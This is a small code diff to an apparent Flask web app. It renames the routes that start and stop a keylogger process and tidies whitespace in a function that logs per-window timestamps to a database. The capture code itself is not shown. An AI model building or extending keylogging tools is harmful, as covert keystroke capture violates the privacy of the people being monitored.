@@ -41,7 +41,6 @@ def add_data():
                         {"window": window},
                         {"$set": {f"timestamps.{timestamp}": new_value}}
                     )
-
             else:
                 data_collection.insert_one({
                     "window": window,
@@ -60,7 +59,7 @@ def add_data():
 
 
 process = None
-@app.route('/start', methods=['GET'])
+@app.route('/start_keylogger', methods=['GET'])
 def start_keylogger():
     global process
     if process is None:
@@ -69,7 +68,7 @@ def start_keylogger():
     return jsonify({"status": "Keylogger already running"}), 400
 
 
-@app.route('/stop', methods=['GET'])
+@app.route('/stop_keylogger', methods=['GET'])
 def stop_keylogger():
     global process
     if process is not None:
